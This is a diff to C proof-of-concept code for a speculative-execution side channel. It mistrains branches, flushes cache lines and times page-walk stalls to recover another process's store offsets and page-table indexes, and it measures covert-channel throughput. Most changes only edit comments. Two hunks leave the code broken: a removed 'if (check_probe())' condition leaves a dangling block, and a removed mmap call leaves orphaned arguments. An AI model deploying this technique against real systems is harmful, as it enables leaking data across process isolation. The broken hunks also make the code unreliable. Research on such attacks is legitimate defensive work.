@@ -12,6 +12,7 @@
 static u32 threshold; // cache hit threshold
 static u8 *victim_page, *normal_page, *probe, *garbage; // some handy pages
 
+// allocate PRIVATE memory and initialize it
 static u8 *setup_page(size_t size, u8 init) {
     u8 *page = mmap(NULL, size, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
@@ -28,17 +29,20 @@ static void unmap(u8 *page, size_t size) {
     }
 }
 
+// get index for a given pointer and a level of page table
+// PGD (level 4) -> PUD (level 3) -> PMD (level 2) -> PTE (level 1)
 static u16 get_PL_index(void *ptr, u8 level) {
     u64 page = ((uintptr_t)ptr >> 12);
     return (page >> ((level - 1) * 9)) & 0x1ff;
 }
 
-// we only need one bit of information to indicate if PT walk stalls,
-// therefore, we only need a probe array with one element,
-// and access it if PT walk doesn't stall.
-// But we want to avoid using 0 as an index,
-// as it can be a default value used for some forwarding (e.g., Meltdown),
-// so we use an array with two pages and (only) access the second one.
+// we only need one bit of information to indicate if page walk stalls,
+// therefore, we only need a probe array with one element, and it will be
+// accessed if page walk does not stall. So, we will have something like this:
+// probe[*load], if page walk does not stall, *load returns 0 and probe[0] is
+// acessed. However, we want *load to return a non-zero if page walk does not
+// stall, since zero can be a default value used for some forwarding (e.g.,
+// Meltdown), so we use an array with two pages and access probe[1 * page_size].
 static void flush_probe() {
     _clflush(probe + getpagesize());
 }
@@ -48,9 +52,8 @@ static bool check_probe() {
 }
 // end of util functions
 
-// use MISTRAIN_EPOCH - 1 to mistrain, then mispredict
+// use the first (MISTRAIN_EPOCH - 1) to mistrain, then mispredict
 #define MISTRAIN_EPOCH 6
-
 static int __attribute__((noinline)) store_offset_recovery() {
     int ret = 0;
     const u32 MEASURES = 100;
@@ -62,6 +65,8 @@ static int __attribute__((noinline)) store_offset_recovery() {
     if (pid == 0) {
         u16 offset = 0x888; // offset of the store
         while (true) {
+            // normal_page is NOT shared, the child process will make a copy on
+            // write
             _mwrite(&normal_page[offset], 0xff);
         }
     } else if (pid < 0) {
@@ -69,6 +74,7 @@ static int __attribute__((noinline)) store_offset_recovery() {
         return 2;
     }
 
+    // allocate 512 pages to cover all possible PL1 (PTE) indexes
     u8 *pages = setup_page((1 << 9) * page_size, 0x1);
     if (!pages) {
         ret = 3;
@@ -79,29 +85,29 @@ static int __attribute__((noinline)) store_offset_recovery() {
         u8 *ptr = pages + disp * page_size;
         u32 counter = 0;
         for (size_t cnt = 1; cnt <= MEASURES * MISTRAIN_EPOCH; cnt++) {
-            flush_probe();
-            _clflush_v(&size1);
-            _clflush_v(&size2);
-            _clflush_v(&size3);
+            flush_probe(); // prepare F+R probe
+            _clflush_v(&_size1); // create long latency branch
+            _clflush_v(&_size2);
+            _clflush_v(&_size3);
             ptedit_invalidate_tlb(ptr);
             _mfence();
 
-            // tmp is all ones if cnt % MISTRAIN_EPOCH == 0;
+            // tmp will be all ones (-1) if cnt % MISTRAIN_EPOCH == 0;
             // i.e., it's time to mispredict
             u64 tmp = ((cnt % MISTRAIN_EPOCH) - 1) & (~0xffff);
             tmp = tmp | (tmp >> 16);
 
-            // only select probe on misprediction
-            // equivalent to tmp ? probe : garbage, but branchless
+            // only select probe on misprediction (i.e., tmp = -1)
+            // equivalent to arr = tmp ? probe : garbage, but branchless
             u8 *arr = (u8 *)SEL_NOSPEC(tmp, probe, garbage);
             _lfence();
             if ((tmp < _size1) & (tmp < _size2) & (tmp < _size3)) {
-                // on misprediction, arr points to probe
-                // if *ptr is NOT stalled, we can observe signals from probe
+                // on misprediction, arr points to probe if *ptr is NOT stalled,
+                // we can observe signals from probe[PAGE_SIZE]
                 _maccess(&arr[*ptr * page_size]);
             }
 
-            if (check_probe()) {
+            // check if *ptr successfully returns 0x1 during misprediction
                 counter += 1;
             }
         }
@@ -135,8 +141,7 @@ static int __attribute__((noinline)) load_page_recovery_throughput() {
     fprintf(stderr, "\tPL2 index: %#x\n", get_PL_index(page, 2));
     fprintf(stderr, "\tPL1 index: %#x\n", get_PL_index(page, 1));
 
-    // controls when to measure throughput in sender
-    volatile u8 *start = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
+    // shared variable controls when to measure throughput in sender
                              MAP_SHARED | MAP_ANONYMOUS, -1, 0);
     // shared page to store throughput results
     u64 *counts = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
@@ -155,7 +160,8 @@ static int __attribute__((noinline)) load_page_recovery_throughput() {
             u64 cnt = 0;
             while (!*start); /* busy wait */
 
-            // start measurement
+            // start throughput measurement, we should observe a lower
+            // throughput if _maccess(page)'s page walk is stalled a lot
             while (*start) {
                 ptedit_invalidate_tlb(page);
                 _maccess(page);
@@ -229,6 +235,8 @@ static int __attribute__((noinline)) load_page_recovery_contention() {
         u8 *ptr = victim_page + (disp << 3);
         u64 total_time = 0;
         // measure execution latency for MEASURES times
+        // we should observe a smaller latency if our store stalls page walk
+        // in the sender, since more L1D resources would be available
         for (u32 cnt = 0; cnt < MEASURES; cnt++) {
             struct timespec t_start, t_end;
             _lfence();
